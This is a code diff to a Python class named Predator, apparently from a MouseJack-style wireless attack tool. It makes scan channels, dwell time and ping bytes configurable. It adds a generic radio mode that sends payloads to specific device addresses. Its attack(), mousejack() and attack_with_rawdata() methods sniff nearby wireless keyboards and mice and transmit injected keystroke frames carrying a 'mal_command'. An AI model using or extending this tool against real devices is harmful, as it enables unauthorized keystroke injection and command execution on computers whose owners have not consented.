@@ -4,27 +4,43 @@ from six import iteritems
 from datetime import datetime
 from Script.Plugins import FingerprintRegistry, DriverRegistry
 
-PING = [0x0f, 0x0f, 0x0f, 0x0f]
-CHANNEL_DWELL_TIME = 0.1
-
 
 class Predator(object):
-    def __init__(self, vid, pid, activate_lna: object = True):
+    def __init__(self, vid, pid, config):
+        self.config = config
         self.driver_key = f'{vid}_{pid}'
         self.drivers = DriverRegistry.discover_drivers()
         self.radios = None
         self.channel = None
-        self.channels = range(2, 84)
+        self.channels = range(int(self.config['sc']['channels']['from']), int(self.config['sc']['channels']['to']))
         self.channel_index = 0
-        self.ping = PING
+        self.channel_dwell_time = round(float(config['sc']['dwell']), 2)
+        self.ping = self.parse_ping_to_hex_list(str(self.config['sc']['ping']))
+        self.rf_index = self.config['dv']['rf_index']
+        self.rf = self.config['dv']['rf'][self.rf_index]
+        self.generic = self.config['dv']['generic']
         self.devices = {}
         self.HID = list(FingerprintRegistry.discover().values())
-        self.init_radio(activate_lna)
+        self.init_radio(config['dv']['lna'])
         self.scan_active = False
 
     def close(self):
         if self.radios and hasattr(self.radios, 'device'):
             usb.util.dispose_resources(self.radios.device)
+
+    @staticmethod
+    def parse_ping_to_hex_list(ping_str: str) -> list:
+        if not ping_str or ping_str.strip() == '':
+            return [0x0f, 0x0f, 0x0f, 0x0f]
+
+        ping_list = []
+        for x in ping_str.split(','):
+            x = x.strip().lower()
+            if x.startswith('0x'):
+                ping_list.append(int(x, 16))
+            else:
+                ping_list.append(int(x, 10))
+        return ping_list
 
     @staticmethod
     def str_to_hex(data):
@@ -69,9 +85,11 @@ class Predator(object):
         self.devices = {}
         return
 
-    def scan(self, generic=False, timeout=0.5, callback=None):
-        if generic:
-            self.radios.activate_promiscuous_mode_generic()
+    def scan(self, callback=None):
+        key = self.config['dv']['rf_index']
+        rf = str(self.config['dv']['rf'][key])
+        if self.generic:
+            self.radios.activate_promiscuous_mode_generic(radio_freq=rf)
         else:
             self.radios.activate_promiscuous_mode()
 
@@ -81,8 +99,8 @@ class Predator(object):
         self.radios.set_channel(self.channels[self.channel_index])
 
         if len(self.channels) > 1:
-            while time.time() - start_time < timeout:
-                if time.time() - last_tune > CHANNEL_DWELL_TIME:
+            while time.time() - start_time < self.config['sc']['timeout']:
+                if time.time() - last_tune > self.channel_dwell_time:
                     self.channel_index = (self.channel_index + 1) % len(self.channels)
                     self.radios.set_channel(self.channels[self.channel_index])
                     last_tune = time.time()
@@ -98,7 +116,6 @@ class Predator(object):
                         callback(address, payload)
                     else:
                         self.device_detected(self.hex_to_str(address), payload)
-
             return self.devices
 
     def sniff(self, timeout, addr_string, callback=None):
@@ -111,7 +128,7 @@ class Predator(object):
         start_time = time.time()
 
         while time.time() - start_time < timeout:
-            if len(self.channels) > 1 and time.time() - last_ping > CHANNEL_DWELL_TIME:
+            if len(self.channels) > 1 and time.time() - last_ping > self.channel_dwell_time:
                 if not self.radios.send_payload(self.ping, 1, 1):
                     for self.channel_index in range(len(self.channels)):
                         self.radios.set_channel(self.channels[self.channel_index])
@@ -162,12 +179,20 @@ class Predator(object):
     def send_payload(self, payload):
         return self.radios.send_payload(payload)
 
-    def attack(self, hid, mal_command):
+    def send_payload_generic(self, payload, address):
+        return self.radios.send_payload_generic(payload, address)
+
+    def attack(self, hid, mal_command, address):
         hid.build_frames(mal_command)
+        if self.generic and address:
+            send_payload_func = lambda payload: self.send_payload_generic(payload, address)
+        else:
+            send_payload_func = self.send_payload
+
         for key in mal_command:
             if key['frames']:
                 for frame in key['frames']:
-                    self.send_payload(frame[0])
+                    send_payload_func(frame[0])
                     time.sleep(frame[1] / 1000)
 
     def mousejack(self, targets, mal_code):
@@ -180,7 +205,7 @@ class Predator(object):
             if hid:
                 for channel in channels:
                     self.set_channel(channel)
-                    self.attack(hid(address, payload), mal_code)
+                    self.attack(hid(address, payload), mal_code, address)
 
     def attack_with_rawdata(self, targets, payload):
         for address, target in iteritems(targets):
@@ -229,7 +254,10 @@ class Predator(object):
             self.radios.activate_sniffer_mode(address)
             for channel in channels:
                 self.radios.set_channel(channel)
-                self.radios.send_payload(payload)
+                if self.generic:
+                    self.radios.send_payload_generic(payload, address)
+                else:
+                    self.radios.send_payload(payload)
 
     @staticmethod
     def get_payload(targets):
@@ -239,23 +267,3 @@ class Predator(object):
             payload_hex = ':'.join(f'{byte:02X}' for byte in payload)
             payloads.append(payload_hex)
         return payloads
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
